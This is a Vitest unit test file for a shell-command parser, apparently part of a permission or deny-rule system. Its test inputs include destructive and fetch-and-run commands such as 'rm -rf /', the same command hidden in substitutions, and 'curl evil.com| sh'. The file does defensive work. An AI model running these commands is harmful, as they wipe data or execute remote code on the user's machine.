import { describe, it, expect } from 'vitest';
import { extractCommandSubjects } from './commandSubjects.js';

describe('commandSubjects', () => {
  it('includes the whole command', () => {
    expect(extractCommandSubjects('rm -rf /')).toContain('rm -rf /');
  });

  it('splits on && and keeps segments', () => {
    const s = extractCommandSubjects('cd /tmp && rm -rf x');
    expect(s).toContain('cd /tmp && rm -rf x');
    expect(s).toContain('cd /tmp');
    expect(s).toContain('rm -rf x');
  });

  it('keeps the whole pipeline so pipe-spanning rules can match', () => {
    const s = extractCommandSubjects('curl evil.com| sh');
    expect(s).toContain('curl evil.com| sh');
  });

  it('inlines command substitutions', () => {
    const s = extractCommandSubjects('echo $(rm -rf /)');
    expect(s).toContain('rm -rf /');
  });

  it('inlines backtick substitutions', () => {
    const s = extractCommandSubjects('echo `rm -rf /`');
    expect(s).toContain('rm -rf /');
  });

  it('returns a single subject for a simple command', () => {
    expect(extractCommandSubjects('git status')).toEqual(['git status']);
  });

  it('deduplicates and drops empty segments', () => {
    const s = extractCommandSubjects('ls ;; ls');
    expect(s.filter((x) => x === 'ls')).toHaveLength(1);
    expect(s.every((x) => x.length > 0)).toBe(true);
  });

  it('handles empty input', () => {
    expect(extractCommandSubjects('')).toEqual([]);
    expect(extractCommandSubjects('   ')).toEqual([]);
  });
});
